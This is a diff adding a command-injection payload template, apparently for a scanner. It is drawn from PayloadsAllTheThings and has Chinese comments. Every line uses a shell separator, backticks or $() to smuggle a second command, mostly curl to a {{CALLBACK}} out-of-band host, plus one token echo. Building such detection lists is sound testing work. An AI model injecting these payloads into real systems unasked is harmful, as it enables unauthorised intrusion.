@@ -1,0 +1,15 @@
+# 命令注入载荷模板（精选自 PayloadsAllTheThings，去 Windows/URL 编码/HTML 噪声，改为回连/回显插桩）
+# {{CALLBACK}} = 回连 URL（OOB 通道）；{{TOKEN}} = 回显 token（reflection 通道）；\n = 真实换行
+# 按最常命中在前排序
+; curl {{CALLBACK}}
+; curl {{CALLBACK}};
+| curl {{CALLBACK}}
+|| curl {{CALLBACK}}
+& curl {{CALLBACK}}
+&& curl {{CALLBACK}}
+`curl {{CALLBACK}}`
+$(curl {{CALLBACK}})
+"; curl {{CALLBACK}}; echo "
+'; curl {{CALLBACK}}; echo '
+\n curl {{CALLBACK}}\n
+; echo {{TOKEN}}
